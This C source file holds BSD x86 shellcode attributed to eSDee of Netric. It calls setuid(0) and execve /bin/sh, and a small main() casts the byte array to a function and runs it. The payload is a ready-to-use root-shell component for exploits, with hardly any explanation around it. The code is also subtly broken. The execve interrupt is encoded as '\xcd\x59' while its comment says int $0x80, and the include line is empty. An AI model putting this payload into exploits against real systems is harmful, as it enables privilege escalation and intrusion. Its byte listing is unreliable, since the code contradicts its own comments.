/* BSD x86 shellcode by eSDee of Netric (www.netric.org)
 * setuid(0,0); execve /bin/sh; exit();
 *
 * Updated by Steve after advice from  Nathan Myers
 */

//#include 
char
shellcode[] =

        // setuid(0,0);
        "\x31\xc0"                              // xor    %eax,%eax
        "\x50"                                  // push   %eax
        "\x50"                                  // push   %eax
        "\x50"                                  // push   %eax
        "\xb0\x17"                              // mov    $0x17,%al
        "\xcd\x80"                              // int    $0x80

        // execve /bin/sh
        "\x31\xc0"                              // xor    %eax,%eax
        "\x50"                                  // push   %eax
        "\x68\x2f\x2f\x73\x68"                  // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"                  // push   $0x6e69622f
        "\x89\xe3"                              // mov    %esp,%ebx
        "\x50"                                  // push   %eax
        "\x54"                                  // push   %esp
        "\x53"                                  // push   %ebx
        "\x50"                                  // push   %eax
        "\xb0\x3b"                              // mov    $0x3b,%al
        "\xcd\x59"                              // int    $0x80

        // exit
        "\x31\xc0"                              // xor    %eax,%eax
        "\xb0\x01"                              // mov    $0x1,%al
        "\xcd\x80";                             // int    $0x80
int
main()
{
   void (*code)() = (void *)shellcode;
   printf("Shellcode length: %d\n", strlen(shellcode));
   code();

   return(0);
}
